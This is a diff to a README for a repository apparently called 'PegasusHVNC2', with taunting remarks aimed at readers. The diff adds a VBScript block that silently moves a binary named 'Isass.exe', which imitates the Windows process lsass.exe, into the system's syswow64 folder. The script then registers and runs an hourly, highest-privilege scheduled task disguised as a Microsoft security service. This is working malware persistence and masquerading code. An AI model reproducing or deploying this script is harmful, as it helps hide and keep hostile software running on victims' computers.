@@ -1,6 +1,24 @@
 # PegasusHVNC2
 You must've tried hard? xD
-
+![badpony](https://user-images.githubusercontent.com/1867768/164579605-c4a11e62-87d5-48eb-bd95-f2dd976ac840.png)
+```
+on error resume next
+set o=createobject("wscript.shell")
+'f=o.ExpandEnvironmentStrings("%appdata%\Pantheon")
+f=o.ExpandEnvironmentStrings("%appdata%")
+c = "cmd /c md " & f 
+'o.run c,0,1
+WScript.Sleep(1000)
+'c = "cmd /c move " & chr(34) & f & "\..\Isass.exe" & chr(34) & " " & chr(34) & f & chr(34)
+c = "cmd /c move " & chr(34) & f & "\Isass.exe" & chr(34) & " " & chr(34) & "C:\windows\syswow64" & chr(34)
+o.run c,0,1
+'c = "schtasks /create /f /tn " & chr(34) & "OneDrive.{7d01bf11-6e05-4dfd-8936-9366c7d70b4d}" & chr(34)
+c = "schtasks /create /f /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34)
+c = c & " /sc hourly /rl highest /tr " & chr(34) & "c:\windows\syswow64\Isass.exe" & chr(34)
+o.run c,0,1
+Wscript.Sleep(2000)
+o.run "schtasks /run /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34),0,0
+```
 
 Keep up the good work ^^
 
